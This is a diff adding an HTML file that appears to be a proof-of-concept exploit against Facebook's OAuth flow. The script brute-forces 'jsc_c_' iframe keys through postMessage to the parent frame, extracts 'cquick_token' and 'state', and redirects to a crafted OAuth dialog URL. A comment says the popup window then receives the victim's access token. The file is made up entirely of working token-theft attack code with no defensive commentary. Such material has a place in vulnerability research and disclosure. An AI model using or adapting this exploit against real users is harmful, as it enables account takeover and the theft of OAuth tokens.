@@ -1,0 +1,50 @@
+<html>
+    <script>
+        brutelist = []
+        channels = []
+        charset = ["0","1","2","3","4","5","6","7","8","9"];
+        for(let x=0;x<26;x++){
+            charset.push(String.fromCharCode(x+97))
+        }
+        for(let x=0;x<charset.length;x++){
+            for(let i=0;i<charset.length;i++){
+            brutelist.push(charset[x]+charset[i]);
+        }
+        }
+        // Extract state and cquick_token then 
+        function message_receiver(message) {
+            uri = new URL("https://ysamm.com" + message.data.uri);
+            token = uri.searchParams.get("cquick_token");
+            state = uri.searchParams.get("state");
+            final_url = "https://apps.facebook.com/dialog/oauth?app_id=124024574287414&redirect_uri=https%3A%2F%2Fwww.facebook.com/dialog/return/arbiter%3Fversion%3D46%26relation%3Dtop%23origin%3Dfb124024574287414://authorize&ctarget=https%3A%2F%2Fapps.facebook.com&cquick=1&response_type=token&cquick_token=" + token + "&state=" + state;
+           window.location.href = final_url;
+        }
+        
+        function brute_ifrm_name(){
+            i=0;
+            intv = setInterval(()=> {
+                if (i>brutelist.length) clearInterval(intv);
+                i++;
+                x = new MessageChannel(); 
+                // Bruteforce the iframeKey
+                ifrm_name = "jsc_c_" + brutelist[i];
+                parent.postMessage({compatAction:"CompatSetup",iframeKey:ifrm_name},"*",[x.port1]);
+                // Setup the function that receives the message.
+                x.port2.onmessage = message_receiver;
+                // Get the dialog URL with cquick_token and state
+                setTimeout(()=>{x.port2.postMessage({compatAction:"request-loaddialog"});},10);
+            
+            },20);
+        }
+        function oauth_send() {
+            // This window would receive the response with access_token finally since we're redirecting in this window to the dialog/oauth url. 
+            window.open("stage2.html","", "width=200,height=100");
+            setTimeout(()=>{
+                brute_ifrm_name();
+            },2000);
+        }
+        
+        oauth_send()
+
+    </script>
+</html>
